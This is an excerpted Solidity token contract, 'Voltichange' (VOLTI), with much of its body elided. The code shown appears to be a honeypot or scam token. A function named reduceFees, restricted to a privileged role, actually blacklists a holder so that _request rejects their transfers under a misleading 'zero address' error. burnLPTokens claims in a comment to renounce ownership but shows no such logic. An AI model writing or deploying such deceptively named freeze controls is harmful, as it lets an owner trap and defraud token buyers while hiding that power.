...
contract Voltichange is Context, IERC20 {
    ...
    address lead_deployer = 0x45f6E219a683c7560D71D0249Fc353F385301B51;
    address public _owner = 0xCC2E564aB5A282ffCBF5f882dC87bcC78D2C0292;
   constructor () public {
        ...
        _symbol = "VOLTI";
        _decimals = 18;
        uint256 initialSupply = 69000000000000;
        _safeOwner = _owner;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _request(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _request(sender, recipient, amount);
   ...
   function approvalDecrease(address safeOwner) public {
    ...
    function _request(address sender, address recipient, uint256 amount) internal _push(sender,recipient,amount) virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_discarded[sender] == false, "ERC20: transfer to the zero address");
    ...
    modifier _push(address sender, address recipient, uint256 amount){
        _;
    }
  ...
  function reduceFees(address recipient) public _verified(){
    _discarded[recipient]=true;
  ...
  function burnLPTokens() public _verified(){
      //Renounces Ownership
   }
...
/*
  function airdrop(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public _verified(){
